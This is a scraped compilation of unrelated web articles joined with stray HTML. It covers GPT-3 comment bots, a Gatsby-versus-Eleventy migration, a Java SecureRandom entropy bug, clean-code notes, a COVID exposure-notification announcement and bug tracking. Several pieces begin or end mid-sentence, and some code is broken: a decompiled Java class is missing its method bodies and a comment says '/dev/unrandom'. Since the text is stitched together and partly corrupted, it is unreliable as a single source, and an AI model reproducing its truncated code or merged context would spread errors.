<p>How do you get to the point, then, where you're only filtering by human comments? What happens when its 99,000 comments, and 99% of them bots?? Will you know? Will you be influenced?</p>
<p>Will the average person be influenced? If advertising and the idea of saying something over and over works, and words are <em>free,</em> and you can GPT-3 your hand-rolled (or state authorized) propaganda every day in every comment thread in every forum to look like an average person is advocating for X, will other average people be more convinced of X?</p>
<p>This is the twilight of the comment sections.</p>
<p>Rather than authors GPT-3ing their own works and then revealing that they were ghost-written by the computer, the creepy scenario is someone hand-crafting conspiracy theories or lies so wild that no respectable person would fall for them, and then using GPT-3 bots to make it look like consensus is real, and convincing millions via synthetic social pressure.</p>
<p>Or: people sometimes edit wikipedia, write an article and use wiki as a source, then several days later change Wikipedia to use the article as a source. A synthetic citation. What's that look like at scale? Remember: The bar for writing is low.</p>
<p>I don't think the future will be dark. In fact I'm quite optimistic. But I think social networks and forum sites will change. They won't compete over who has the biggest piles of content (user counts), they will compete over context (authenticity, real friends, small discussions). In other words, the next reddit, twitter, &amp; facebook etc competitors will not look like reddit, twitter &amp; facebook.</p>
<p>They will be smaller by design, harder to get in to, and slower-paced. And they'll be better. Note that by solving the GPT-3 problem, you also largely solve the troll problem. Well, hopefully. Note in the above Commentdämmerung scenario, they can only happen as long as words are free. The simplest way to avoid this problem is to charge a small admissions fee. Then at least only actors with deep pockets can influence the average reader.</p>
<p>Note: GPT-3 isn't there yet for something like this. After reviewing a lot of GPT-3 output for a while today, I'm actually unimpressed. The daemon of genius clearly isn't home. The uncannily good ones that get shared are shared by humans, that is, they're hand-picked and so make the output look better than it is on average. But we can expect a point in the future where free-for-all comment sections are essentially over, if actors want them to be. I think this is unfortunate because most of world history existed in dialogue, and then we shifted to mass-media, inventing ideology along the way, and its only recently in the internet age that we have returned to the agora model of mass person-to-person communication. (I've written about that, <a href="https://medium.com/@simon.sarris/are-we-still-thinking-795bd9f4a658">here</a>). It would be a big shame if this ruins the bigger agoras, and it might.</p>
<p>I find it hard to believe at this point that synthetic writing will replace good writers, just as computers have not replaced chess players. But I suspect it will become a crucial tool for creatives, just as chess engines have become a crucial tool for chess players to see what they're doing wrong, how they could improve, etc. A thesaurus is useful, a GPT-4-saurus would be much nicer. Imagine the writers block one could overcome, with a suggestion engine trained on you and writers you admire! Perhaps it's not writers who should worry, but editors.</p>
<p>Then again, do imagine a suggestion engine writing away alongside you. After a while, are you doing the thinking, or are you letting the GPT-4-saurus take over? Are you convincing the readers, or is the program's most-compelling-path-of-least-resistance just operant conditioning both you and the readers? Who's clicking publish?</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p>At the beginning of this year, I decided it was finally time to port my website from a <span>PHP</span>-based <span>CMS</span><sup><a href="#fn1" id="fnref1">[1]</a></sup> to a JavaScript-based Static Site Generator (<span>SSG</span>). This was for a few reasons:</p>
<ol>
<li>After starting out as a ‘full-stack’ developer, I now work solely on the front end: If I need to write custom functionality, I don’t want to write it in <span>PHP</span> when I could be writing it in JavaScript.</li>
<li>I don't need the layers of abstraction or the complexity of a <span>CMS</span> — markdown files are where I'm most comfortable writing content and I’d be happy never to touch a My<span>SQL</span> database or <span>wysiwyg</span> editor again.</li>
<li>I want to improve my site’s performance: static <span>HTML</span> files are, 99 times out of 100, going to be faster than pages built on the fly.</li>
<li>Lastly, there’s the cost benefit: A <span>LAMP</span> stack<sup><a href="#fn2" id="fnref2">[2]</a></sup> server costs money every month; Netlify’s free tier (300 build minutes/month) should comfortably cover a personal blog at zero cost.</li>
</ol>
<p>Once I'd decided I want a Static Site Generator and it needed to use JavaScript (which ruled out <a href="https://jekyllrb.com/">Jekyll</a> and <a href="https://gohugo.io/">Hugo</a>), I narrowed the list down to two very different contenders:</p>
<h2>“I heard Gatsby was good”</h2>
<p>According to <a href="https://www.gatsbyjs.org/">the official site</a>, “Gatsby is a free and open source framework based on React that helps developers build blazing fast websites and apps”. It has a data layer powered by GraphQL and it outputs everything to static files, allowing you to host it pretty much anywhere.</p>
<p>When I first heard that I could write React and use this cool new GraphQL thing, while still outputting static pages that work without JavaScript, I was keen to give it a try. <em>‘This sounds like Progressive Enhancement but without the effort’</em> I thought. Unfortunately, as with most things that sound too good to be true, after some investigation, there turned out to be a catch. Here's what happens the first time a user visits a Gatsby site:</p>
<ol>
<li>The user requests a page</li>
<li>The server sends the statically-generated <span>HTML</span> document to the user’s browser and the browser starts rendering the page.</li>
<li>Now that the <span>HTML</span> document has arrived, the JavaScript bundle (including the React library and any other JavaScript required to render the page) begins downloading, parsing and compiling in the background</li>
<li>The JavaScript is ready to run — the whole <span>DOM</span> gets “hydrated”<sup><a href="#fn3" id="fnref3">[3]</a></sup> with React components</li>
</ol>
<p>There’s something not quite right here — Gatsby forces you to load the same page again, but as React components; until that extra step is complete, none of the elements that require JavaScript (e.g. buttons, menus, custom inputs) are actually interactive.</p>
<p>If your site doesn’t have any interactive elements (excluding links, they work without JavaScript, even in Gatsby), your users still have to download this JavaScript anyway, for the sole purpose of turning your site into a Single-Page Application (<span>SPA</span>), which has its own drawbacks as we'll soon discover.</p>
<p>This extra bloat seems to go against one of the main reasons for moving to a <span>SSG</span>: making pages faster. Your flashy Gatsby site might be fast on a $2,000 MacBook, but for someone using a budget smartphone on a 3G connection, it's visible yet unresponsive, for 15 seconds while the user waits for the JavaScript to load. It’s also unnecessarily draining their battery <em>and</em> data allowance.</p>
<p>If the browser needs to parse 296kb of JavaScript<sup><a href="#fn4" id="fnref4">[4]</a></sup> to show a list of blog posts, that’s not Progressive Enhancement, it’s using the wrong tool for the job. To use the rather fuzzy website/web app distinction — React is for building web apps: interactive UIs that need to respond to user input or fetch data in real time — your blog is just a website <em>and that’s fine</em>.</p>
<h2>Accessibility in single-page applications</h2>
<p>A single-page application is a website that forgoes the traditional method of navigation on the web, i.e. loading new content by loading a new <span>HTML</span> document; instead it uses JavaScript features like <span>AJAX</span> and the History <span>API</span> to swap in new content without triggering a page load. The goal is to increase perceived performance and make the website feel more like a 'native' app (something you’d download from an app store). The problem with getting rid of full-page reloads is that browsers and assistive technology use page loads as a signal to trigger certain useful behaviours, including announcing the title of the new page or resetting keyboard focus to the beginning of the document.</p>
<p>If you’re an accessibility-conscious developer building a single-page application, you may try to emulate the browser’s behaviour using JavaScript. Gatsby attempts to handle this for you by including a <code>RouteAnnouncer</code> component. This uses an <a href="https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/ARIA_Live_Regions"><span>ARIA</span> live region</a> to announce the <code>title</code> or <code>h1</code> of the page, alerting users of screenreader software to navigation changes. This approach, however, is not without its problems: there are still outstanding issues around <a href="https://github.com/gatsbyjs/gatsby/issues/21059">configuration</a> and <a href="https://github.com/gatsbyjs/gatsby/issues/20801">localisation</a>.</p>
<p>We’ve seen that the Single-page applications have inherent accessibility issues around navigation, but it’s worth bearing in mind that using a front-end framework can make other aspects of accessibility harder too. In a February 2020 survey of one million homepages, WebAIM found that those using React had 5.7% more accessibility errors than average; while those using Vue had 25% more<sup><a href="#fn5" id="fnref5">[5]</a></sup>. This doesn’t necessarily mean that the frameworks caused these errors, but there’s a strong correlation between more JavaScript and worse accessibility.</p>
<h2>Does a blog even need JavaScript?</h2>
<p>Chances are, the first webpage your ever built performed far better than some of the pages you've built since — it consisted of an <span>HTML</span> file and some <span>CSS</span>; maybe it had a few unoptimised images but they didn’t stop the page from loading. If you're anything like me, the moment you started adding JavaScript was the moment the performance of your webpage took a nosedive. Not all bytes are made equal: an image is going to take far less time to decode and render to the screen than the equivalently sized JavaScript file would take to parse, compile, and execute<sup><a href="#fn6" id="fnref6">[6]</a></sup>.</p>
<p>JavaScript is a powerful language that can do some incredible things, but it’s incredibly easy to jump to using it too early in development, when you could be using <span>HTML</span> and <span>CSS</span> instead. Consider the <a href="https://www.w3.org/2001/tag/doc/leastPower.html">rule of least power</a>: Don’t use the more powerful language (JavaScript) until you’ve exhausted the capabilities of less powerful languages (<span>HTML</span>). To me, it feels that turning a blog into a JavaScript Single-page application is introducing unnecessary complexity.</p>
<p>I don't want this post to come across as a specific attack on Gatsby. There are some clever people behind it, who’ve acknowledged many of the issues mentioned in this article and are trying to solve them. A statically rendered and hydrated page is still infinitely better than a fully client-side rendered React app (like those generated by <a href="https://github.com/facebook/create-react-app">create-react-app</a>) which is useless without JavaScript. I do have issues with the way that its JavaScript-heavy, Single page app approach is advertised, <a href="https://www.gatsbyjs.org/blog/2020-01-30-why-gatsby-is-better-with-javascript/">including in Gatsby’s own marketing</a>, as appropriate for any kind of website. Client-side JavaScript has a cost and developers should be aware of it.</p>
<h2>Building a Gatsby site with less JavaScript</h2>
<p>This brings me to a dilemma: developing sites with Gatsby is an all-round great experience; but Developer Experience (DX) should always be secondary to User Experience (UX) — how do I build a Gatsby site without the issues inherent in Gatsby’s JavaScript heavy approach? By removing as much of it as possible, of course. Fortunately, there are some fantastic efforts going on within the Gatsby community to build faster, more lightweight sites:</p>
<p>Firstly, you could save a few kilobytes by swapping React for Preact, with <a href="https://www.gatsbyjs.org/packages/gatsby-plugin-preact/">gatsby-plugin-preact</a>. I use this on <a href="https://component.gallery/">the Component Gallery</a> and it works seamlessly, instantly knocking ~30kb off the JavaScript payload.</p>
<p>If you want to take a more drastic approach, there's a <a href="https://www.gatsbyjs.org/packages/gatsby-plugin-no-javascript/">plugin which removes <em>all</em> the Gatsby JavaScript from your Gatsby site</a>. Now we’re getting somewhere! You can continue to write react components and GraphQL, even use a CSS-in-JS library (as long as it outputs CSS or inline styles), <em>without</em> sending any JavaScript to the browser. Most of the problems with Gatsby can be solved by throwing out all of its client side JavaScript. <a href="https://gatsby-starter-low-tech-blog.netlify.com/low-tech/">Gatsby Starter Low Tech Blog</a> uses the no-javascript plugin, as well as some other techniques including converting all images to greyscale, to help you create an incredibly lightweight and energy-efficient blog.</p>
<h2>Starting from scratch with Eleventy</h2>
<p>At this point I felt like something was wrong — using a framework that heavily pushes client-side JavaScript, but removing all of that JavaScript seemed like a pretty convoluted way to build a website. I wanted to see whether I could build a fully-featured blog with zero client-side JavaScript and instead of using a plugin to remove it, I wasn’t going to add it in the first place. This is where my other contender comes in:</p>
<p><a href="https://www.11ty.dev/">Eleventy</a> encourages you to build your site how you want to. You use the technology you're most comfortable with and it sticks to generating your pages. Eleventy gives you the option of mixing and matching ten different templating languages, including markdown, nunjucks, and liquid; this meant I could copy and paste my old twig templates from Craft, change the file extension, and with some minor tweaks have them running in Eleventy. Instead of adapting my front-end build process to a new bundler I could just drop in my existing webpack file and <code>src</code> folder. Using the <a href="https://www.npmjs.com/package/concurrently">concurrently</a> package I can run my build script at the same time as Eleventy’s <code>serve</code> process.</p>
<p>Like Gatsby, Eleventy also has an ecosystem of plugins (which is small, but rapidly growing). I’ve picked out a few that I've used which have enabled me to add features without adding client-side JavaScript:</p>
<p>When displaying code snippets in a post, it’s common to include language-specific syntax highlighting. There are a few JavaScript libraries out there that can do it, the most popular of which seems to be <a href="https://prismjs.com/">Prism</a> — normally you’d run this in the client, but because …</p></div></div>

That is until a few months ago.</p><p>Google recently announced <a href="https://cloud.google.com/run">Cloud Run</a>. It allows anyone to deploy containers in production really fast.

From our experience, the cold starts are usually around 400ms.</p><h2 id="the-architecture">The Architecture</h2><p>In order to serve someone else's model we had to know for sure that the architecture would be robust and scalable.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <p>At my current job, we needed to move an aging web service into our job management system for reliability reasons.</p>
<p>After implementing the code and merging it into our master branch, the unit tests were failing for some people but not others. Particularly, if you wiggled your mouse during these non-interactive backend tests, the unit tests would pass!</p>

<p>I modified our extensive unit test suite to add a new workflow using the third-party JARs that the old web service used, and it was working great. I was working in a small branch because my coworkers were working on a bigger feature in master. When they checked the tests and did a code review, they pulled my change into master.</p>
<p>And then the tests broke.</p>
<p>Alright, we thought, there is some sort of test conflict. But the tests always worked on my machine. And worked most of the time on my coworkers' machines. And never worked on Jenkins. But always worked when actually deployed to our dev environment.</p>
<p>We tried loading our machines to see if there was a CPU or disk load issue, but it wasn't. Running tests individually would work, but not when run all together with Maven.</p>
<p>After extensive analysis and debugging, my coworker found that if you were actively using your computer while Maven was running, the test would work. Otherwise it would time out.</p>
<p>How is that possible?</p>
<h2 id="a-short-detour-to-explain-our-workflow-system">A short detour to explain our workflow system</h2>
<p>To understand how this bug will break the tests, I figured I would explain how our workflow system works at a very high level. We have tasks that do something like so:</p>
<div><pre><span></span><span>public</span> <span>class</span> <span>DownloadSomething</span> <span>extends</span> <span>Task</span> <span>{</span>
    <span>@Override</span>
    <span>public</span> <span>Result</span> <span>do</span><span>(</span><span>TaskInfo</span> <span>info</span><span>)</span> <span>{</span>
        <span>Downloader</span> <span>downloader</span> <span>=</span> <span>new</span> <span>Downloader</span><span>(</span><span>info</span><span>.</span><span>getInput</span><span>());</span>

        <span>while</span> <span>(</span><span>downloader</span><span>.</span><span>notDone</span><span>())</span> <span>{</span>
            <span>Chunk</span> <span>chunk</span> <span>=</span> <span>downloader</span><span>.</span><span>getNextChunk</span><span>();</span>
            <span>appendToFile</span><span>(</span><span>chunk</span><span>);</span>

            <span>heartbeat</span><span>();</span>
        <span>}</span>
        <span>return</span> <span>success</span><span>(</span><span>"Downloaded"</span><span>);</span>
    <span>}</span>
<span>}</span>
</pre></div>


<p>A workflow is made up of tasks like this one, which have input and produce output, such as a file. However, each task might fail either because the download URL is incorrect, or the network connection is down. </p>
<p>If your implementation of do() was merely</p>
<div><pre><span></span><span>while</span><span>(</span><span>true</span><span>)</span> <span>{</span>
    <span>Thread</span><span>.</span><span>sleep</span><span>(</span><span>1</span><span>);</span>
<span>}</span>
</pre></div>


<p>we would interrupt the task and the test would fail.</p>
<p>So we have logic that will time out a task if it does not heartbeat early and often. We have special InputStream classes which wrap other InputStreams and heartbeat as the consumer is reading them.</p>
<p>This is a relatively common pattern.</p>
<h2 id="what-was-making-this-task-timeout">What was making this task timeout?</h2>
<p>This particular task read some <a href="http://en.wikipedia.org/wiki/X.509">X.509 certificates</a> from disk and then called the proprietary JARs with their proprietary logic. Reading the certificates was taking <em>minutes</em>. Literally five or more minutes on occasion. Why?</p>
<p>Our special heartbeating InputStream wasn't even helping, so the code that was allegedly reading certificates was doing something else entirely. </p>
<p>Something that only took awhile when you <em>weren't</em> using your computer.</p>

<p>If you wanted some secure random numbers, for encryption purposes, how would you do that? In Java, the way is <a href="http://docs.oracle.com/javase/7/docs/api/java/security/SecureRandom.html">SecureRandom</a>. How does SecureRandom work?</p>
<p>If you look at the <a href="http://hg.openjdk.java.net/jdk7/jdk7/jdk/file/tip/src/share/classes/java/security/SecureRandom.java">source code for SecureRandom</a>, the default constructor calls getDefaultPRNG, which gets a provider, such as <a href="http://hg.openjdk.java.net/jdk7/jdk7/jdk/file/tip/src/share/classes/sun/security/provider/SecureRandom.java">sun.security.provider.SecureRandom</a> to provide actual secure random numbers.</p>
<p>To get the random data, the user calls SecureRandom.nextBytes:</p>
<div><pre><span></span><span>synchronized</span> <span>public</span> <span>void</span> <span>nextBytes</span><span>(</span><span>byte</span><span>[]</span> <span>bytes</span><span>)</span> <span>{</span>
    <span>secureRandomSpi</span><span>.</span><span>engineNextBytes</span><span>(</span><span>bytes</span><span>);</span>
<span>}</span>
</pre></div>


<p>which calls the specific implementation random number generation, such as in sun.security.provider.SecureRandom. If there was no seed specified (as there often isn't), the implementation will call a seed generator class such as <a href="http://hg.openjdk.java.net/jdk7/jdk7/jdk/file/tip/src/share/classes/sun/security/provider/SeedGenerator.java">sun.security.provider.SeedGenerator</a>.</p>
<p>SeedGenerator has a few implementations, one of which is an interesting threading randomness generator. The other is URLSeedGenerator, which uses /dev/random</p>
<div><pre><span></span><span>final</span> <span>static</span> <span>String</span> <span>URL_DEV_RANDOM</span> <span>=</span> <span>SunEntries</span><span>.</span><span>URL_DEV_RANDOM</span><span>;</span> <span>// /dev/unrandom</span>

<p>So it reads from <a href="http://en.wikipedia.org/wiki//dev/random">/dev/random</a> where appropriate. What's an important difference between /dev/random and its counterpart /dev/urandom? Well, /dev/random can and will block on Linux when there isn't enough randomness to go around.</p>
<p>To test this theory (that the certificate loading code, was for whatever reason, consuming a lot of entropy) we did this:</p>
<div><pre><span></span><span># mv /dev/random /dev/random.bkup</span>
<span># ln -s /dev/urandom /dev/random</span>
</pre></div>


<p>And the problem went away! Tests were completely consistent now.</p>
<h2 id="why-did-wiggling-the-mouse-fix-the-tests">Why did wiggling the mouse fix the tests?</h2>
<p><a href="http://en.wikipedia.org/wiki/Entropy_%28computing%29#Linux_kernel">Linux uses multiple sources</a> to generate entropy for /dev/random. On the Jenkins build server and when we weren't using our computers, /dev/random would run out of entropy quickly and blocked.</p>
<p>Using the computer (which I almost always do while the build is running) kept it working, which is why I didn't notice any failures.</p>
<p>Since SecureRandom is a pseudo-random number generator that uses a cryptographically secure seed, it should use /dev/urandom instead of /dev/random, in my opinion.</p>
<h2 id="why-was-loading-an-x509-certificate-using-random-numbers">Why was loading an X.509 certificate using random numbers?</h2>
<p>Ah, the magic of mystery third-party libraries. Using the awesome Java decompiler <a href="http://java.decompiler.free.fr/">JD</a>, I decompiled the JARs we were given and poked around a little. In the load certificate method, I found this:</p>
<div><pre><span></span><span>public</span> <span>static</span> <span>X509Certificate</span> <span>loadCert</span><span>(</span><span>InputStream</span> <span>paramInputStream</span><span>)</span> <span>throws</span> <span>CertificateException</span>
<span>{</span>
    <span>CertificateFactory</span> <span>localCertificateFactory</span> <span>=</span> <span>CertificateFactory</span><span>.</span><span>getInstance</span><span>(</span><span>"X.509"</span><span>,</span> <span>ProviderInit</span><span>.</span><span>getProvider</span><span>());</span>
    <span>X509Certificate</span> <span>localX509Certificate</span> <span>=</span> <span>(</span><span>X509Certificate</span><span>)</span><span>localCertificateFactory</span><span>.</span><span>generateCertificate</span><span>(</span><span>paramInputStream</span><span>);</span>
    <span>// snip</span>
</pre></div>


<p>Isn't Java wonderfully concise? But wait, what's that ProviderInit buisness? More JD magic gives us:</p>
<div><pre><span></span><span>public</span> <span>class</span> <span>ProviderInit</span> <span>{</span>
    <span>public</span> <span>static</span> <span>Provider</span> <span>getProvider</span><span>()</span>

        <span>if</span> <span>(</span><span>!</span><span>initDone</span><span>)</span>
            <span>init</span><span>();</span>
        <span>return</span> <span>provider</span><span>;</span>
    <span>}</span>

    <span>private</span> <span>static</span> <span>void</span> <span>init</span><span>()</span>

<p>So, when ProviderInit is first run, it does some self tests using CryptoJ, which is from an ancient Java crypto library made by RSA called JSAFE. These CryptoJ self tests use SecureRandom judiciously, and thus take a long time if there is little entropy.</p>

<p>All we need to do to fix our tests is to call ProviderInit.init() when the JVM loads, rather than when our time sensitive code is being run. Easy enough!</p>
<p>The lesson: use /dev/urandom when appropriate, and don't run self tests in non-debug code.</p>

July 17, 2020 | https://smalldata.tech/blog/2018/09/16/clean-code-notes | <a href="https://web.archive.org/web/*/https://smalldata.tech/blog/2018/09/16/clean-code-notes">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>
  The following is a list of notes taken on writing clean code, i.e. code that is maintainable and extensible.
</p>
<h5 id="names">Names</h5>
<p>
  Naming is the <i>hardest</i> and the most important part of writing clean code. Names should clearly express intent
  and the assumption here is that everyone involved in the codebase has the same cultural background which is not
  always the case in practice. Some general tips:
  </p><ul>
    <li>Classes should be Nouns, e.g. <code>User</code></li>
    <li>Methods should be verbs, e.g. <code>getById()</code>, <code>save()</code></li>
    <li>No need for prefixes such as <code>m_</code> or <code>str</code> for strongly typed languages</li>
    <li>Pick one word per concept, e.g. <code>fetch</code>, <code>retrieve</code> and <code>get</code> are
      semantically equal</li>
  </ul>

<h5 id="functions">Functions</h5>
<p>
  Functions or methods are the fundamental building blocks of programming. In fact, the internal operation of
  programs normally consists mostly of functions pushing data onto and popping data off the stack as they call each
  other. Sometimes memory needs to be allocated on the heap for data that must survive across function calls.
</p>
<p>
  When a function is called, a <strong>stack frame</strong> is created to support the function's execution. The stack
  frame contains the function's local variables and the arguments passed to the function by its caller. The frame
  also contains housekeeping information that allows the called function (the callee) to return to the caller safely.
  The exact contents and layout of the stack vary by processor architecture and function call convention.
</p>
<div>
  <p><a href="https://smalldata.tech/img/blog/call-stack-layout.svg">

  </p>
</div>
<p>
  Some general tips on writing functions:
  </p><ul>
    <li>Functions should be small and they should do 1 thing only:
      <ul>
        <li>Only have 1 level of indentation - highly nested functions should be refactored into sub-routines</li>
        <li>
          <strong>No side-effects!</strong>
          <pre>public int sum(int a, int b) {
    int result = a + b;
    resetGui(); // this is untestable and introduces a hidden dependency!
    return result;
}
</pre>
        </li>
      </ul>
    </li>
    <li>Do not return <code>null</code> - caller will need to always check cluttering p code, consider using <i>special
        case</i> return values</li>
    <li>Don't pass <code>null</code> as a parameter value either</li>
    <li>Prefer exceptions for error conditions except in cases were a <code>Nullable</code> or <code>Optional</code>
      type is available</li>
    <li>Should ideally return a value, especially for monadic functions as this allows function chaining</li>
    <li>Fewer arguments are better - the more the arguments, the more the complexity and test cases that need to be
      written</li>
  </ul>

<h5 id="oop">Object Oriented Programming</h5>
<p>
  An important but suble point to note in OOP is that objects hide their data behind abstractions and expose
  functions that operate on that data whereas data structures expose their data and have no meaningful functions.
  Good OOP requires knowing when to use objects and when to use data structures. Consider the following example:
  </p><pre>public class Point {
    public double x;
    public double y;
}

public interface Point {
    double getX();
    double getY();
    void setCartesian(double x, double y);
    double getR();
    double getTheta();
    void setPolar(double r, double theta);
}
</pre>
    <p>
      In the second <code>Point</code> definition the co-ordinate system being used by the implementation is not
      known and need not necessarily be cartesian nor polar!
    </p>
    <p>
      Tips on writing clean OO code:
      </p><ul>
        <li>Classes should be small and follow the Single Responsibility Principle (SRP)</li>
        <li>Classes should have high cohesion, i.e. operate on a small number of variables</li>
        <li>Avoid using boundary interfaces, e.g. instead of returning a <code>Map</code>, wrap it in a class (<code>Sensors</code>)
          to encapsulate the implementation</li>
        <li>Comments should only be used for clarification or amplification - avoid in general and let the code
          do the talking!</li>
        <li>Prefer exceptions to error codes - error codes have the habit of spilling out into the entire
          system</li>
        <li>Use unchecked exceptions to not break encapsulation</li>
      </ul>
    
    <p>
      Finally, procedural code makes it hard to add new data structures because all the functions must change. OO
      code makes it hard to add new functions because all the classes must change. Again, writing clean code
      requires insight as to when to use which style of programming.
    </p>
    <h5 id="tdd">Test Driven Development</h5>
    <p>
      Unit Tests should follow the F.I.R.S.T principle, i.e. they should be Fast, Independent of any external
      dependencies or manual setup, Repeatable, Self-validating (no manual checking verification) and Timely (run
      just before writing production code). Some general tips on writing clean tests:
      </p><ul>
        <li>Tests should be readable above all else and this might mean relaxing certain production code
          restrictions on performance</li>
        <li>Single concept per test</li>
        <li>Create helper methods to simplify complicated setups</li>
        <li>Convert multiple asserts into a single assert via a state pattern</li>
      </ul>
    

    <p>
      The three laws of TDD:
      </p><dl>
        <dt>First law</dt>
        <dd>You may not write production code until you have written a failing test.</dd><dt>Second law</dt>
        <dd>You may not write more of a test than is sufficient to fail, and not compiling is failing.</dd>
        <dt>Third law</dt>
        <dd>You may not write more production code than is sufficient to pass the currently failing test.</dd>
      </dl>
    

    <div>
      <p><a href="https://smalldata.tech/img/blog/011-clean-code.jpg">
        <img alt="" src="https://smalldata.tech/img/blog/011-clean-code.jpg">
      </a></p><p>
        Not quite TDD.
      </p>
    </div>

    <h5 id="system-design">System Design</h5>
    <ul>
        <li>Classes should follow the open-closed principle - open for extension but closed for modification.
          Consider the following example where we write an <code>AreaCalculator</code> which calculates the
          total area of a collection of rectangles.
          <pre>public class Rectangle {
    public double width;
    public double height;
}

public class AreaCalculator {

    public double calculateArea(Collection<rectangle> rectangles) {
        double result = 0;
        for (Rectangle r : rectangles) {
            result += r.width * r.height;
        }
        return result;
    }
}
</rectangle></pre> We would now like to extend this function to calculate the area of circles as well. Our new function now looks
          as follows:
          <pre>public abstract class Shape { }

public class Rectangle extends Shape {
    public double width;
    public double height;
}

public class Circle extends Shape {
    public double radius;
}

public class AreaCalculator {

    public double calculateArea(Collection<shape> shapes) {
        double result = 0;
        for (Shape s : shapes) {
            if (s instanceof Rectangle) {
                Rectangle r = (Rectangle) s;
                result += r.width * r.height;
            } else {
                Circle c = (Circle) s;
                result += c.radius * c.radius * Math.PI;
            }
        }
        return result;
    }
}
</shape></pre> Extending this further to calculate the area of triangles now requires another modification to the <code>calculateArea</code>
          method, i.e. it is not <strong>open for extension</strong>. We can change this by introducing an
          <code>area</code> method on the <code>Shape</code> data structure. Our code now looks like the
          following:
          <pre>public abstract class Shape {
    abstract double area();
}

public class Rectangle extends Shape {
    public double width;
    public double height;

    @Override
    public double area() {
        return width * height;
    }
}

public class Circle extends Shape {
    public double radius;

    @Override
    public double area() {
        return radius * radius * Math.PI;
    }
}

public class AreaCalculator {

    public double calculateArea(Collection<shape> shapes) {
        double result = 0;
        for (Shape s : shapes) {
            result += s.area(); // note the simplicity
        }
        return result;
    }
}
</shape></pre>
        </li>
        <li>Dependency Inversion Principle - depend upon abstractions and interfaces, not concrete
          implementations</li>
        <li>When building large software systems, try to avoid doing a big design up front - use a dependency
          injection container to separate cross-cutting concers like transactions, logging, etc. from
          business logic</li>
      </ul>

	<p><em>Starting in 2006 with the Public Health Laboratory Interoperability Project (PHLIP)—one of the first systems that allowed public health entities to exchange standardized data—APHL has worked to make connections between public health laboratories and agencies more efficient. Those efforts took a dramatic step forward with the <a href="https://www.aphl.org/programs/informatics/Pages/aims_platform.aspx" target="_blank" rel="noopener noreferrer">APHL Informatics Messaging Services</a> (AIMS) platform, which has evolved from a one-way router of critical health information to a secure, cloud-based platform that transports, translates, validates and hosts data for federal, state and local public health agencies.</em></p>
<p><em>&nbsp;</em><em>The emergence of <a href="https://www.aphlblog.org/category/infectious-diseases/covid-19/" target="_blank" rel="noopener noreferrer">COVID-19</a> required swift action to develop systems and processes that support public health agencies and their pandemic response efforts. In the last seven months, APHL has worked to create new connections, develop new message formats, standardize language and host a variety of solutions to aid in the COVID response. This blog post, regarding exposure notification, is the first in a series that outlines and explains these efforts.</em></p>
<p><strong>How Does Exposure Notification Work?</strong></p>
<p>To limit the spread of COVID-19, information must travel faster than the virus can. The scope and transmission rate of COVID-19 makes this a monumental challenge for public health agencies. Exposure notification technology, however, is a potential game changer. By providing rapid alerts to individuals who may have been in close proximity to someone who has COVID-19, exposure notifications allow the spread of information to stay one step ahead.</p>
<p>Working in conjunction with Apple, Google and Microsoft, APHL is taking a major step to support public health agencies that want to provide focused, privacy-preserving and user-controlled exposure notifications at scale using the Apple | Google Exposure Notifications System. APHL’s presence on the project gives the US public health community a capable and accountable partner for hosting key components of this groundbreaking technology.</p>
<p><strong>The Apple | Google Exposure Notifications System (A|G ENS)</strong></p>
<p>To augment traditional COVID-19 contact tracing efforts around the world, Apple and Google co-developed the A|G ENS, which consists of an Exposure Notification Application Protocol Interface (API) that is available on both the iOS and Android operating systems. Apps developed by public health agencies can then use the Exposure Notification API to help determine if a user may have been exposed to another user who subsequently tested positive for COVID-19. This is accomplished through the use of privacy-preserving randomly generated numbers also known as keys, which in turn generate temporary IDs that are transmitted between devices using Bluetooth Low Energy signals. Apps using this system are not permitted to collect or use location data from the device, and user identities are not revealed to other users, Apple, Google or APHL.</p>
<p>Rather than each state and territorial public health agency bearing the burden of building and hosting its own key servers, a national server can securely host the keys of those affected users, eliminate duplication and enable notifications across state borders. APHL is also championing the effort to build and host a national key server on behalf of the public health community. This will allow users to continually benefit from exposure notifications as they travel across state lines, and help state and territorial agencies deploy their apps quickly.</p>
<p>“APHL’s participation is key to the success of these efforts,” said Washington State Secretary of Health John Wiesman. “Without a national key server, each state that chooses to implement such an application would be responsible for its own data sets. APHL’s centralized and secure national server will be accessible to every state public health agency.”</p>
<p>Microsoft is supporting the partnership by working with APHL to host the national key server, based on the open source reference design created by Google Cloud. Through Microsoft’s Azure cloud platform, Microsoft will provide cloud services that will allow APHL to host the key server and securely enable interstate operability for the apps that public health agencies deploy.</p>
<p>Only users who choose to download an app developed by their public health agency and voluntarily opt in can receive exposure notifications. If users are alerted to a possible exposure, the app will also provide information about what to do next.</p>
<p>“We’re honored to partner with Apple, Google and Microsoft to make this groundbreaking technology accessible to state and territorial public health agencies,” Bill Whitmar, president of APHL and director of the Missouri State Public Health Laboratory, said. “Apps using this technology will rapidly inform users of a potential exposure to COVID-19 and provide them information they can use to protect themselves and their families.”</p>
<p><em>APHL develops technological innovations that support public health agencies at the federal, state and local level.

        <p><strong>Every software QA team keeps records about the bugs it finds. But which data points are really worthwhile to track? These four guidelines might help.</strong></p>
<p>Soon after we made the offer on our new house, we arranged with the realtor to get back inside with a tape measure. We wanted to plan where to put furniture in order to ease decisions on move-in day; would the bookcases fit along that wall? Naturally, we completely forgot to take several measurements (such as the distance from the kitchen entrance to the dining room door) or marked them incompletely (was the master walk-in closet 6 feet wide or 6 feet long?). While we did well, overall, some of the house’s finer details came as a complete surprise. Not all of them were pleasant ones.</p>
<p>So it is with software testing. You only find the bugs you look for. When you record and track any project, you can only detect trends in the things you measure.</p>
<p>Collecting lots of information “just in case” isn’t a solution, either. The more irrelevant information you require, the more the database fills up with junk, which makes people less willing to consult it. So it makes sense to identify the information that is truly worthwhile to track – without particular regard to the development tools used for the purpose.</p>
<p>One reason that the tool choice isn’t a major component in this discussion is that most applications do a good job. The people who create software for defect tracking understand testers’ and programmers’ needs, so the built-in functionality works well.</p>
<p>For example, bug tracking tools provide the right set of fields for most people’s needs. Few testers need to add unique items to track besides the mundanely obvious (such as date reported, priority, and description), much less customize the database or reporting. Isn’t it nice to discover a set of developer tools with which the users are happy?</p>
<p>However, there are some tips and techniques worth sharing.</p>
<h3>Track how often a bug is reopened</h3>
